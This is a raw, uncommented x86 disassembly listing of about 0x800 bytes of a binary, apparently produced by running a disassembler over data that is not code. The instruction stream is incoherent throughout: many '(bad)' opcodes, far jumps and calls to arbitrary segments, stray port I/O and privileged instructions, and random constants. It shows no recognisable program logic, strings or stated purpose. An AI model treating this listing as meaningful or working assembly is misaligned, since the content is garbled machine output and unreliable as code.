  405edb:	rcr    BYTE PTR [esi-0x5e],cl
  405ede:	leave  
  405edf:	mov    ?,WORD PTR [ebp+0x61a0ab4e]
  405ee5:	adc    ebp,edx
  405ee7:	jp     0x405e9d
  405ee9:	push   edx
  405eea:	jae    0x405f22
  405eec:	scas   eax,DWORD PTR es:[edi]
  405eed:	mov    ds:0x9ee2f549,al
  405ef2:	ret    
  405ef3:	mov    ch,0xad
  405ef5:	addr16 in al,dx
  405ef7:	or     bh,BYTE PTR es:[eax+0x6d]
  405efb:	(bad)  
  405efc:	sar    ch,1
  405efe:	pop    ebp
  405eff:	mov    cl,ch
  405f01:	inc    ebp
  405f02:	shl    DWORD PTR [edi],cl
  405f04:	fsubr  QWORD PTR [edx]
  405f06:	and    DWORD PTR [edx-0x26e64d67],ebp
  405f0c:	pop    edx
  405f0d:	or     eax,DWORD PTR [eax-0x744ca205]
  405f13:	aam    0x11
  405f15:	push   esi
  405f16:	cmp    eax,0x391926df
  405f1b:	dec    ecx
  405f1c:	and    edi,esi
  405f1e:	adc    BYTE PTR [ebp+0x69],dl
  405f21:	mov    cl,0x30
  405f23:	mov    bh,BYTE PTR [edi-0x2558fba3]
  405f29:	inc    ebx
  405f2a:	jg     0x405ec2
  405f2c:	adc    edx,esi
  405f2e:	cmc    
  405f2f:	repnz aam 0xa7
  405f32:	jmp    0x27b2:0x742e6ffe
  405f39:	sbb    DWORD PTR [edi+edx*1-0x5d],ebx
  405f3d:	lahf   
  405f3e:	dec    edx
  405f3f:	scas   al,BYTE PTR es:[edi]
  405f40:	mov    ebx,0x3db349d3
  405f45:	pop    ds
  405f46:	mov    dl,0x4
  405f48:	les    edi,FWORD PTR [esi]
  405f4a:	inc    edx
  405f4b:	push   edx
  405f4d:	jae    0x405f68
  405f4f:	jns    0x405f53
  405f51:	ds sub al,0xef
  405f54:	push   0x3e0c3a72
  405f59:	cmp    al,0xf6
  405f5b:	jp     0x405f31
  405f5d:	bound  eax,QWORD PTR [edx]
  405f5f:	or     ah,BYTE PTR [esp+ecx*8-0x4f4bbe23]
  405f66:	arpl   WORD PTR [ebx+0x62],bx
  405f69:	popa   
  405f6a:	inc    ebp
  405f6b:	jnp    0x405f2c
  405f6d:	and    BYTE PTR [edx+0x7d01195],ah
  405f73:	pop    ds
  405f74:	pop    ecx
  405f75:	(bad)  
  405f76:	xchg   BYTE PTR [esi-0x60],dh
  405f79:	pop    ebp
  405f7a:	dec    eax
  405f7b:	stos   BYTE PTR es:[edi],al
  405f7c:	xchg   edi,eax
  405f7d:	in     eax,0x31
  405f7f:	push   edi
  405f80:	xor    al,0x42
  405f82:	fsub   DWORD PTR [ecx]
  405f84:	mov    dl,0xdc
  405f86:	mov    WORD PTR ds:0xa5a823b8,fs
  405f8c:	imul   ebp,edx,0xffffff92
  405f8f:	mov    ebp,0x8cae4b79
  405f94:	or     DWORD PTR [ebx-0x32afbdf1],eax
  405f9a:	sbb    dl,BYTE PTR [eax-0x7400b80f]
  405fa0:	jl     0x405f91
  405fa2:	mov    edx,0xf1389034
  405fa7:	and    DWORD PTR [ebp-0x7c11f38d],eax
  405fad:	sub    cl,BYTE PTR [ebx-0x7]
  405fb0:	inc    ecx
  405fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fb2:	loop   0x405fdf
  405fb4:	xor    BYTE PTR [edi],ch
  405fb6:	push   ebp
  405fb7:	in     eax,dx
  405fb8:	cdq    
  405fb9:	push   ss
  405fba:	mov    ch,0xca
  405fbc:	stc    
  405fbd:	hlt    
  405fbe:	mov    al,bh
  405fc0:	push   ecx
  405fc1:	dec    ebp
  405fc2:	cmp    DWORD PTR [edx],eax
  405fc4:	pusha  
  405fc5:	ins    DWORD PTR es:[edi],dx
  405fc6:	or     eax,0x847bb941
  405fcb:	xchg   edi,eax
  405fcc:	or     al,ah
  405fce:	sbb    ebx,0x56
  405fd1:	sti    
  405fd2:	jp     0x405fe4
  405fd4:	mov    esi,0x7c9225ae
  405fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fda:	mov    DWORD PTR [eax-0x7a],0x6cee54a0
  405fe1:	add    al,0xf1
  405fe3:	dec    edi
  405fe4:	push   ebp
  405fe5:	add    ecx,esp
  405fe7:	ror    DWORD PTR [esi-0x4123e832],1
  405fed:	fild   DWORD PTR [ecx]
  405fef:	dec    ebp
  405ff0:	mov    DWORD PTR ds:0x20462806,edx
  405ff6:	cli    
  405ff7:	repnz inc eax
  405ff9:	pop    esp
  405ffa:	bound  eax,QWORD PTR [eax+0x68]
  405ffd:	jns    0x405fb0
  405fff:	mov    bl,0xf4
  406001:	xor    edi,DWORD PTR [ebx]
  406003:	mov    dl,0x4b
  406005:	xchg   edx,eax
  406006:	std    
  406007:	and    edx,0xd199cc9e
  40600d:	and    BYTE PTR [eax+edx*1+0x75],cl
  406011:	mov    cl,0x6d
  406013:	dec    ecx
  406014:	push   ebx
  406015:	int3   
  406016:	imul   eax,DWORD PTR [ecx-0x18],0xe
  40601a:	test   eax,edi
  40601c:	or     ch,BYTE PTR [eax-0x474c5668]
  406022:	adc    DWORD PTR [esi+0x99530a0],eax
  406028:	sub    BYTE PTR [edx+eiz*2+0x4a],bh
  40602c:	ret    0xaeec
  40602f:	jb     0x406043
  406031:	jnp    0x405fda
  406033:	sbb    DWORD PTR [ebp-0x7d95e25b],ebx
  406039:	lds    edx,FWORD PTR [ecx]
  40603b:	jae    0x405fe1
  40603d:	cmc    
  40603e:	xor    edi,ecx
  406040:	push   esi
  406041:	lods   al,BYTE PTR ds:[esi]
  406042:	sbb    ah,BYTE PTR [edi+0x12def3a9]
  406048:	or     DWORD PTR [esi],ebp
  40604a:	mov    WORD PTR [ebp-0x6f],ss
  40604d:	pusha  
  40604e:	jl     0x40603e
  406050:	pop    eax
  406051:	ror    ebx,0x1a
  406054:	shl    DWORD PTR [ecx+0x66],cl
  406057:	mov    ah,0xbe
  406059:	sti    
  40605a:	mov    esi,0x40252f80
  40605f:	sub    al,BYTE PTR [eax+0x65]
  406062:	xchg   ecx,eax
  406063:	mov    eax,ds:0x4b4ec47c
  406068:	and    BYTE PTR [esi-0x1c5b97fe],cl
  40606e:	add    ah,bh
  406070:	inc    ecx
  406071:	je     0x40604d
  406073:	sbb    eax,0x7c383c9a
  406078:	ds push ebx
  40607a:	sbb    ch,BYTE PTR [esi-0x6d5dee9c]
  406080:	inc    eax
  406081:	and    DWORD PTR [ebx+0x16776b29],eax
  406087:	dec    ebp
  406088:	out    dx,al
  406089:	pop    ecx
  40608a:	pop    ebx
  40608b:	mov    edi,0x17c68406
  406090:	fidiv  WORD PTR [esi+0x3c]
  406093:	mov    eax,DWORD PTR [esi]
  406095:	and    DWORD PTR [ebx],ecx
  406097:	call   0xe337:0xccdf4e8f
  40609e:	mov    eax,ds:0x912a4bab
  4060a3:	loop   0x4060be
  4060a5:	push   eax
  4060a6:	fldpi  
  4060a8:	outs   dx,BYTE PTR ds:[esi]
  4060a9:	aam    0x1a
  4060ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060ac:	loop   0x4060fa
  4060ae:	(bad)  
  4060af:	fs push ds
  4060b1:	dec    ebp
  4060b2:	mov    al,ds:0x7e0c89b
  4060b7:	add    eax,0x9217ae48
  4060bc:	push   esi
  4060bd:	and    ecx,DWORD PTR [ebx]
  4060bf:	jbe    0x40610f
  4060c1:	fs fs pop eax
  4060c4:	ss mov eax,0x334855d0
  4060ca:	test   eax,0xb5b8e1a9
  4060cf:	adc    cl,ch
  4060d1:	in     eax,0x84
  4060d3:	shl    BYTE PTR [eiz*8+0x6e1bc067],1
  4060da:	in     al,dx
  4060db:	push   edi
  4060dc:	adc    dh,BYTE PTR [esi-0x10]
  4060df:	push   0xffffffca
  4060e1:	ins    DWORD PTR es:[edi],dx
  4060e2:	test   DWORD PTR [edx-0x29],0x450f2960
  4060e9:	push   cs
  4060ea:	sub    edi,ebx
  4060ec:	lock jecxz 0x40610a
  4060ef:	adc    BYTE PTR ds:0xc0ba0b95,bl
  4060f5:	cdq    
  4060f6:	sbb    esi,eax
  4060f8:	cli    
  4060f9:	push   cs
  4060fa:	loopne 0x406138
  4060fc:	inc    eax
  4060fd:	call   0x5b96:0x1380c02f
  406104:	aaa    
  406105:	push   0x44195832
  40610a:	inc    eax
  40610b:	and    al,0x3b
  40610d:	ret    
  40610e:	or     ah,bl
  406110:	inc    DWORD PTR [ecx-0x6e]
  406113:	sub    eax,0xa786b695
  406118:	mov    ecx,0xad4d93b6
  40611d:	xchg   DWORD PTR [esp+ebx*1],ebx
  406120:	test   BYTE PTR [ebp-0x7b27c6bc],al
  406126:	mov    ebx,0x3ed69480
  40612b:	xlat   BYTE PTR ds:[ebx]
  40612c:	or     al,0x63
  40612e:	sub    al,0x70
  406130:	ins    BYTE PTR es:[edi],dx
  406131:	cmc    
  406132:	ins    DWORD PTR es:[edi],dx
  406133:	jae    0x406116
  406135:	(bad)  
  406136:	retf   0x2602
  406139:	inc    esp
  40613a:	xor    BYTE PTR [edi-0x5faf3c17],al
  406140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406141:	mov    ebx,0xe7d499bd
  406146:	je     0x4060d8
  406148:	push   0x3b
  40614a:	xchg   edi,eax
  40614b:	mov    esp,0x2a4cbfa9
  406150:	in     al,dx
  406151:	push   esp
  406152:	xchg   ebx,eax
  406153:	mov    cs,WORD PTR [ebx+eax*4]
  406156:	push   edi
  406157:	xor    eax,0x56bbf633
  40615c:	std    
  40615d:	mov    al,0xc
  40615f:	aad    0xbd
  406161:	test   DWORD PTR [ecx+esi*2-0x70],ecx
  406165:	outs   dx,BYTE PTR ds:[esi]
  406166:	jno    0x4061c8
  406168:	dec    esi
  406169:	jecxz  0x40618f
  40616b:	call   0x54405d07
  406170:	sti    
  406171:	xor    BYTE PTR fs:[ebx+0x65],bh
  406175:	in     al,0x9f
  406177:	add    DWORD PTR [edx+0x19],ebp
  40617a:	sahf   
  40617b:	loop   0x40617c
  40617d:	nop
  40617e:	out    dx,al
  40617f:	dec    edi
  406180:	sub    al,0x26
  406182:	lods   al,BYTE PTR ds:[esi]
  406183:	pop    ebx
  406184:	and    BYTE PTR [ebp+0x35776845],ah
  40618a:	sbb    eax,DWORD PTR [ebx+edx*1]
  40618d:	stos   DWORD PTR es:[edi],eax
  40618e:	ds xor al,0xe3
  406191:	push   ss
  406192:	inc    esi
  406193:	mov    edx,0x43616c4e
  406198:	or     al,0x1c
  40619a:	push   ebx
  40619b:	cmp    al,0xb2
  40619d:	adc    al,0x1c
  40619f:	sbb    ebp,DWORD PTR [eax]
  4061a1:	mov    ecx,0x1fe585f2
  4061a6:	mov    al,ds:0xb7baa329
  4061ab:	adc    BYTE PTR [ebp-0x62],cl
  4061ae:	repnz cmp ecx,esp
  4061b1:	xchg   DWORD PTR [edi-0x47],eax
  4061b4:	ja     0x406161
  4061b6:	icebp  
  4061b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061b8:	in     al,0x62
  4061ba:	mov    dl,0xa3
  4061bc:	punpckhdq mm3,mm3
  4061bf:	push   eax
  4061c0:	sub    eax,0x1a2f36c0
  4061c5:	cwde   
  4061c6:	pop    esi
  4061c7:	jnp    0x40621f
  4061c9:	in     eax,dx
  4061ca:	lea    edi,[ebx+eiz*1]
  4061cd:	jns    0x40614f
  4061cf:	mov    eax,0x96324797
  4061d4:	rcl    BYTE PTR [ecx-0x78],1
  4061d7:	test   BYTE PTR [edi+0x6bd16ce7],bh
  4061dd:	or     ebx,esi
  4061df:	pusha  
  4061e0:	pop    ecx
  4061e1:	cmp    bl,dl
  4061e3:	mov    al,ds:0x59c0a8b0
  4061e8:	sub    DWORD PTR [ebx],esi
  4061ea:	aaa    
  4061eb:	es dec esp
  4061ed:	xchg   edx,eax
  4061ee:	cwde   
  4061ef:	mov    ecx,esp
  4061f1:	xor    bl,BYTE PTR fs:[edx-0x61]
  4061f5:	test   eax,0xe5e62689
  4061fa:	xchg   ebx,eax
  4061fb:	retf   0x7eee
  4061fe:	fs test esi,0x6187e333
  406205:	cmp    dh,BYTE PTR [ecx]
  406207:	cmp    BYTE PTR [esi-0x149575f3],dl
  40620d:	(bad)  
  40620e:	push   edx
  40620f:	imul   ebp,DWORD PTR [ecx+0x57],0x74
  406213:	retf   0x4e09
  406216:	add    DWORD PTR ds:0x911cc74e,0x3
  40621d:	or     edi,DWORD PTR [ecx+0x7201b7aa]
  406223:	xchg   BYTE PTR [ebp+0x64],al
  406226:	jae    0x4061ba
  406228:	dec    eax
  406229:	pushf  
  40622a:	pop    ebp
  40622b:	pop    ebp
  40622c:	in     eax,0xff
  40622e:	nop    ebp
  406231:	or     ebx,DWORD PTR [ebx-0x24b8f214]
  406237:	addr16 dec esi
  406239:	mov    ch,0x75
  40623b:	fstp   DWORD PTR [esi]
  40623d:	pop    ds
  40623e:	sub    eax,0x36aff4b0
  406243:	imul   edx,DWORD PTR [edi-0x64],0x19f35e8
  40624a:	pop    ebp
  40624b:	rcr    BYTE PTR ds:[ecx],1
  40624e:	push   edi
  40624f:	cli    
  406250:	jno    0x4062a8
  406252:	cmp    eax,0x47d313d0
  406257:	xchg   ebx,eax
  406258:	mov    ecx,0xde24dfb3
  40625d:	stc    
  40625e:	ja     0x406272
  406260:	out    dx,al
  406261:	jae    0x406208
  406263:	mov    bh,0xc5
  406265:	or     dh,bl
  406267:	lods   al,BYTE PTR ds:[esi]
  406268:	lds    ecx,FWORD PTR [edx]
  40626a:	rol    DWORD PTR [eax],cl
  40626c:	rcl    DWORD PTR cs:[ecx+0x60],cl
  406270:	xchg   ebx,eax
  406271:	cmp    edx,DWORD PTR [esi-0x6]
  406274:	inc    edx
  406275:	xchg   BYTE PTR ds:0x8a91d84b,ah
  40627b:	pop    ds
  40627c:	loop   0x4062ec
  40627e:	adc    DWORD PTR [ecx+0x58b4960],esi
  406284:	jno    0x4062f5
  406286:	adc    DWORD PTR fs:[edx-0x21],ebx
  40628a:	pop    es
  40628b:	scas   al,BYTE PTR es:[edi]
  40628c:	xchg   edx,eax
  40628d:	mov    ds:0x57c0ebbf,al
  406292:	cmp    ebp,DWORD PTR [esi]
  406294:	jg     0x4062e5
  406296:	and    dh,dh
  406298:	fimul  WORD PTR [esi]
  40629a:	test   DWORD PTR [ecx+0x461623f],esp
  4062a0:	push   0xa57dd291
  4062a5:	inc    edx
  4062a6:	iret   
  4062a7:	jne    0x4062bf
  4062a9:	sub    eax,0xf1dac52d
  4062ae:	mov    al,0xa9
  4062b0:	pop    edi
  4062b1:	bound  ebp,QWORD PTR [ebx-0x454fa429]
  4062b7:	jge    0x40631e
  4062b9:	ins    BYTE PTR es:[edi],dx
  4062ba:	mov    ebx,0xb14757cd
  4062bf:	pop    ebx
  4062c0:	test   eax,ebx
  4062c2:	in     eax,dx
  4062c3:	dec    ebx
  4062c4:	add    eax,DWORD PTR [edi]
  4062c6:	add    eax,0x303e9093
  4062cb:	dec    ebx
  4062cc:	data16 jnp 0x406342
  4062cf:	xor    eax,0x8770be1d
  4062d4:	sub    eax,0xc9a8afc4
  4062d9:	xor    DWORD PTR cs:[esi],esp
  4062dc:	push   edi
  4062dd:	and    cl,BYTE PTR [eax-0x1e36ccc7]
  4062e3:	or     eax,0xb6acf6da
  4062e8:	mov    eax,0x91fcda5e
  4062ed:	and    DWORD PTR [edx-0x3308b82a],ebx
  4062f3:	ret    0xec2a
  4062f6:	nop
  4062f7:	inc    esp
  4062f8:	pop    ebp
  4062f9:	pop    es
  4062fa:	jle    0x4062ee
  4062fc:	push   es
  4062fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062fe:	add    ch,BYTE PTR [edx+0x21]
  406301:	test   DWORD PTR [esi-0xfe6bfaa],esp
  406307:	pop    ecx
  406308:	add    BYTE PTR [esi-0x4f],dl
  40630b:	jmp    0xeea92eeb
  406310:	shl    ecx,1
  406312:	ret    
  406313:	mov    dh,0xa7
  406315:	push   eax
  406316:	push   esi
  406317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406318:	cmp    esi,DWORD PTR ds:0xa2d588cf
  40631e:	data16 mov bl,0xe8
  406321:	xchg   edi,eax
  406322:	inc    esp
  406323:	aam    0x91
  406325:	mov    ch,0x20
  406327:	mov    ebp,DWORD PTR [esi]
  406329:	xchg   ebx,ebp
  40632b:	mov    bl,0xe8
  40632d:	add    DWORD PTR [edi+0x3],ebx
  406330:	repnz lods eax,DWORD PTR ds:[esi]
  406332:	int    0x72
  406334:	sub    edi,DWORD PTR [edi+0x37621e6e]
  40633a:	(bad)  
  40633b:	out    dx,eax
  40633c:	iret   
  40633d:	pop    ss
  40633e:	inc    esp
  40633f:	mov    ebp,0x8d09e624
  406344:	dec    edx
  406345:	fwait
  406346:	jno    0x40632f
  406348:	ss (bad) 
  40634a:	jno    0x4063b0
  40634c:	ret    
  40634d:	mov    ah,0xa6
  40634f:	test   BYTE PTR [eax+0x4a],dl
  406352:	and    eax,0x60dc3755
  406357:	out    0xe7,al
  406359:	cmc    
  40635a:	inc    esi
  40635b:	xchg   ebp,eax
  40635c:	rol    DWORD PTR [eax],0x8e
  40635f:	xlat   BYTE PTR ds:[ebx]
  406360:	fs adc eax,0xcc877b80
  406366:	or     eax,0x5d
  406369:	int3   
  40636a:	ficomp DWORD PTR ds:0x2552d0a6
  406370:	aam    0x17
  406372:	out    dx,al
  406373:	or     eax,0xfc749027
  406378:	or     dh,BYTE PTR [eax+0x67]
  40637b:	call   0x81ab3bbd
  406380:	and    al,0x74
  406382:	call   0x95e5:0x3ac49cf3
  406389:	in     al,0x77
  40638b:	in     eax,dx
  40638c:	cld    
  40638d:	push   0xffffff8a
  40638f:	or     eax,0xe65d5a18
  406394:	je     0x406340
  406396:	mov    bl,0x97
  406398:	dec    eax
  406399:	xchg   edi,eax
  40639a:	sbb    ebp,edi
  40639c:	inc    edi
  40639d:	retf   0xd106
  4063a0:	mov    cl,BYTE PTR ss:[eax-0x5f65f80b]
  4063a7:	push   0xf6879217
  4063ac:	dec    esi
  4063ad:	or     cl,dl
  4063af:	sbb    eax,0x52feb710
  4063b4:	cld    
  4063b5:	(bad)  
  4063b6:	adc    dh,BYTE PTR ds:0x84491a03
  4063bc:	int    0x20
  4063be:	neg    DWORD PTR [ecx+0x31746d67]
  4063c4:	out    dx,al
  4063c5:	adc    al,0x90
  4063c7:	pusha  
  4063c8:	test   bh,0xc8
  4063cb:	stos   DWORD PTR es:[edi],eax
  4063cc:	pushf  
  4063cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063ce:	jp     0x406355
  4063d0:	cmc    
  4063d1:	pop    esp
  4063d2:	rcl    BYTE PTR [ebx+edx*4+0x7cadbe5],0x9a
  4063da:	ss push es
  4063dc:	sbb    eax,0xb1102c5
  4063e1:	retf   0x4016
  4063e4:	xchg   ebx,eax
  4063e5:	shl    BYTE PTR [ebx+ebp*4-0x7ce0f4a],0x7e
  4063ed:	add    edx,DWORD PTR ds:0x52666eb9
  4063f3:	mov    ds:0x971173a6,eax
  4063f8:	or     cl,BYTE PTR [ecx-0x22]
  4063fb:	pop    edx
  4063fc:	cmp    ah,dl
  4063fe:	mov    eax,DWORD PTR [eax]
  406400:	and    DWORD PTR [eax-0x57f7d4f],esp
  406406:	stos   DWORD PTR es:[edi],eax
  406407:	jno    0x40647e
  406409:	xor    BYTE PTR [edi-0x52],0x21
  40640d:	inc    ebx
  40640e:	mov    ebp,0xfa765825
  406413:	fwait
  406414:	mov    ds:0xd5e8fccd,al
  406419:	fld    TBYTE PTR [edi+0x47]
  40641c:	loopne 0x40642e
  40641e:	push   es
  40641f:	dec    ebx
  406420:	(bad)  
  406421:	std    
  406422:	outs   dx,BYTE PTR ds:[esi]
  406423:	or     eax,0x606b063e
  406428:	test   eax,0x8cd97d87
  40642d:	ins    BYTE PTR es:[edi],dx
  40642e:	scas   al,BYTE PTR es:[edi]
  40642f:	adc    DWORD PTR [eax+0x24],edi
  406432:	push   0x23
  406434:	dec    ecx
  406435:	lock pusha 
  406437:	pop    ebx
  406438:	mov    al,0xfa
  40643a:	push   ds
  40643b:	add    bh,BYTE PTR [edi+eiz*8-0x7c]
  40643f:	cmp    DWORD PTR [ecx+esi*8-0x7e3a7e28],0x79
  406447:	push   ecx
  406448:	out    0x36,al
  40644a:	jecxz  0x4063e0
  40644c:	xchg   esi,eax
  40644d:	sub    cl,BYTE PTR [ebx+0x18]
  406450:	jb     0x406461
  406452:	adc    al,0x49
  406454:	cmp    eax,0xd03a1025
  406459:	fbld   TBYTE PTR [ebx-0xa9fd1bd]
  40645f:	xchg   edx,eax
  406460:	faddp  st(4),st
  406462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406463:	(bad)  
  406464:	lfs    eax,FWORD PTR [esp+ecx*8-0xa]
  406469:	adc    ebp,DWORD PTR [ebp+eiz*8+0x4d2a5067]
  406470:	repnz xchg esp,eax
  406472:	xchg   ebx,eax
  406473:	into   
  406474:	int3   
  406475:	sti    
  406476:	outs   dx,BYTE PTR ds:[esi]
  406477:	loopne 0x4064b7
  406479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40647a:	loopne 0x4064a8
  40647c:	mov    dh,BYTE PTR [esi+0x5e]
  40647f:	mov    bh,0x5f
  406481:	sbb    al,0x20
  406483:	mov    ds:0x78b4ea60,al
  406488:	sbb    ebp,DWORD PTR [edi+0x41b5ab67]
  40648e:	jnp    0x40642f
  406490:	and    dh,bl
  406492:	push   edx
  406493:	mov    ch,0x2d
  406495:	popa   
  406496:	call   0xaeb7f1b1
  40649b:	sbb    DWORD PTR [ecx],esp
  40649d:	jbe    0x406495
  40649f:	jmp    0x485c:0x91a6b167
  4064a6:	sub    BYTE PTR [esi],al
  4064a8:	mov    ds:0xdadc5e77,eax
  4064ad:	ss mov cl,0x73
  4064b0:	loope  0x406436
  4064b2:	mov    ds:0x9941a213,eax
  4064b7:	fs push ebx
  4064b9:	jmp    0x4064f9
  4064bb:	lahf   
  4064bc:	hlt    
  4064bd:	cmc    
  4064be:	inc    esi
  4064bf:	cmp    ebx,DWORD PTR [edx-0x22]
  4064c2:	inc    edi
  4064c3:	fcom   QWORD PTR [edx-0x1b58511d]
  4064c9:	cmp    al,0x7e
  4064cb:	pop    ebp
  4064cc:	bound  edi,QWORD PTR [ebp-0x6b]
  4064cf:	inc    eax
  4064d0:	das    
  4064d1:	push   0xd1f8f5b5
  4064d6:	clc    
  4064d7:	pop    es
  4064d8:	fistp  WORD PTR [edi+0x40]
  4064db:	push   ds
  4064dc:	out    0x5,eax
  4064de:	push   0xffffffd8
  4064e0:	mov    ebx,0x38147545
  4064e5:	jnp    0x4064b8
  4064e7:	ror    ebx,1
  4064e9:	xchg   ebx,eax
  4064ea:	sbb    eax,0xb851fcc6
  4064ef:	faddp  st(2),st
  4064f1:	jge    0x4064a0
  4064f3:	mov    dh,0xd0
  4064f5:	lods   eax,DWORD PTR ds:[esi]
  4064f6:	xchg   ebx,eax
  4064f7:	int    0x5d
  4064f9:	not    DWORD PTR [esi]
  4064fb:	jnp    0x4064cb
  4064fd:	fcomi  st,st(4)
  4064ff:	mov    ebp,0xa897ac79
  406504:	pushf  
  406505:	or     eax,0x17d0dac1
  40650a:	mov    ecx,0xe9791b5
  40650f:	xchg   ecx,eax
  406510:	pusha  
  406511:	ret    
  406512:	mov    dl,0x2
  406514:	cli    
  406515:	push   ecx
  406516:	data16 jo 0x40652c
  406519:	jbe    0x4064c2
  40651b:	add    al,BYTE PTR [ecx+0xd]
  40651e:	cdq    
  40651f:	pop    ebx
  406520:	cmp    eax,0x76e3803a
  406525:	pushf  
  406526:	cli    
  406527:	pusha  
  406528:	ins    DWORD PTR es:[edi],dx
  406529:	ss sbb eax,0xcdf3c698
  40652f:	in     eax,dx
  406530:	mov    esp,0x872c6574
  406535:	adc    edi,DWORD PTR [edx]
  406537:	jmp    0xff3b:0x9f1f1d02
  40653e:	add    al,0x9f
  406540:	push   esp
  406541:	xchg   esi,eax
  406542:	jg     0x406582
  406544:	jmp    0x9ce27882
  406549:	loope  0x4065a2
  40654b:	mov    ebp,0xdc3086e9
  406550:	jmp    0x38b2:0xae2a572b
  406557:	jmp    0x406599
  406559:	mov    ds,WORD PTR [eax+0x3d652cc9]
  40655f:	xor    eax,0xf06340ab
  406564:	sbb    al,0x88
  406566:	ror    BYTE PTR [ebp+0x3fee1b5d],1
  40656c:	shr    DWORD PTR [edx-0x1e],1
  40656f:	cmp    al,0xf
  406571:	popf   
  406572:	aas    
  406573:	xchg   ecx,eax
  406574:	xchg   esi,eax
  406575:	repz clc 
  406577:	retf   
  406578:	pop    ss
  406579:	retf   
  40657a:	xchg   ebx,eax
  40657b:	adc    DWORD PTR fs:[edx+0x18],edi
  40657f:	aas    
  406580:	mov    ch,0x15
  406582:	pop    edi
  406583:	sbb    al,BYTE PTR [ecx]
  406585:	popa   
  406586:	popa   
  406587:	push   ecx
  406588:	addr16 repz jns 0x40650e
  40658c:	call   0x7d64:0x9d157829
  406593:	js     0x406520
  406595:	mov    ebx,0x96b6d9ed
  40659a:	pop    edi
  40659b:	or     eax,0x4150420c
  4065a0:	aaa    
  4065a1:	lods   eax,DWORD PTR ds:[esi]
  4065a2:	fdivp  st(7),st
  4065a4:	xor    DWORD PTR [ebx],0xb4185fcb
  4065aa:	in     eax,0x91
  4065ac:	je     0x4065b6
  4065ae:	sbb    eax,0x9ccab6d7
  4065b3:	mov    cl,0x5b
  4065b5:	mov    edi,0xe1a198ee
  4065ba:	dec    edx
  4065bb:	das    
  4065bc:	lods   al,BYTE PTR ds:[esi]
  4065bd:	mov    ch,0xf0
  4065bf:	pop    ebx
  4065c0:	pop    ss
  4065c1:	clc    
  4065c2:	cld    
  4065c3:	sbb    BYTE PTR [edi],ch
  4065c5:	imul   ebp,DWORD PTR [edx-0x389107e6],0xf3e55823
  4065cf:	ja     0x40663a
  4065d1:	in     al,dx
  4065d2:	cmp    BYTE PTR [esi],ah
  4065d4:	inc    ebx
  4065d5:	push   esi
  4065d6:	pop    es
  4065d7:	lods   al,BYTE PTR ds:[esi]
  4065d8:	in     eax,dx
  4065d9:	pop    ss
  4065da:	scas   al,BYTE PTR es:[edi]
  4065db:	ins    DWORD PTR es:[edi],dx
  4065dc:	pop    ecx
  4065dd:	mov    bl,0x5
  4065df:	mov    ds:0xc6cb4293,al
  4065e4:	and    DWORD PTR [ebx+0x72f466ad],edx
  4065ea:	aaa    
  4065eb:	sbb    eax,0x18bff4fd
  4065f0:	jp     0x406628
  4065f2:	jmp    0xf629:0x87fd70ca
  4065f9:	pop    ds
  4065fa:	and    BYTE PTR [esi+0x6d],ch
  4065fd:	push   es
  4065fe:	dec    ecx
  4065ff:	mov    edx,0x25a77ef2
  406604:	adc    ebp,DWORD PTR [ebx+eax*4-0x2cfcf62]
  40660b:	imul   edi,DWORD PTR [ebx-0x7b4c8eda],0x3c4b8cf4
  406615:	stos   DWORD PTR es:[edi],eax
  406616:	xchg   BYTE PTR [ebx-0x3d],bl
  406619:	push   edi
  40661a:	adc    BYTE PTR [edx+0x3c],ah
  40661d:	push   ebx
  40661e:	xchg   edi,eax
  40661f:	lods   eax,DWORD PTR ds:[esi]
  406620:	mov    esp,0x87012bad
  406625:	adc    eax,0x9ef38f18
  40662a:	test   eax,0x36f8e018
  40662f:	mov    ah,0x84
  406631:	sub    al,0x20
  406633:	cmc    
  406634:	unpckhps xmm3,xmm7
  406637:	aaa    
  406638:	xchg   ebx,eax
  406639:	jnp    0x406644
  40663b:	xchg   edi,eax
  40663c:	dec    eax
  40663d:	inc    ebx
  40663e:	fs xchg ecx,eax
  406640:	inc    esp
  406641:	mov    ch,0x5e
  406643:	scas   al,BYTE PTR es:[edi]
  406644:	das    
  406645:	inc    esp
  406646:	ins    BYTE PTR es:[edi],dx
  406647:	jp     0x406691
  406649:	int3   
  40664a:	fsubr  DWORD PTR [ecx-0x39478f15]
  406650:	cli    
  406651:	lock ja 0x40662b
  406654:	mov    ch,0x8d
  406656:	cmp    eax,0x5bd90f3b
  40665b:	jle    0x4065df
  40665d:	mov    ah,0x0
  40665f:	not    BYTE PTR [edi+0x57]
  406662:	jg     0x406652
  406664:	pop    eax
  406665:	adc    BYTE PTR [edi-0x7e6ddc72],ch
  40666b:	shl    DWORD PTR [ebx],cl
  40666d:	and    al,0xb0
  40666f:	les    ebx,FWORD PTR [ecx]
  406671:	push   ebp
  406672:	push   0xffffffcd
  406674:	mov    ds:0xc83b6f98,eax
  406679:	cld    
  40667a:	mov    ah,0x12
  40667c:	sbb    edi,DWORD PTR [esi-0x10]
  40667f:	adc    esp,ebp
  406681:	fwait
  406682:	xor    esi,DWORD PTR [esi-0x76]
  406685:	jle    0x4066ab
  406687:	adc    ebp,DWORD PTR [eax+esi*1+0x66]
  40668b:	add    ch,BYTE PTR [ecx+0x1a8b7b14]
  406691:	lods   eax,DWORD PTR ds:[esi]
  406692:	xchg   esp,eax
  406693:	js     0x406703
  406695:	jmp    0x394c:0x654e532b
  40669c:	aad    0x95
  40669e:	adc    DWORD PTR [esp+edi*8-0x35551233],ecx
  4066a5:	mov    cl,0xed
  4066a7:	dec    esp
  4066a8:	pop    esp
  4066a9:	and    al,0xa6
  4066ab:	lea    esi,[ebx+0x6afd79c0]
  4066b1:	jb     0x406693
  4066b3:	(bad)  
  4066b4:	mov    ah,0x17
  4066b6:	push   edx
  4066b7:	sbb    DWORD PTR [edi+0x3d],esp
  4066ba:	pop    es
  4066bb:	fcom   st(2)
  4066bd:	xor    DWORD PTR [edx+0x6137c5ff],ebx
  4066c3:	mov    al,ds:0x91a2104e
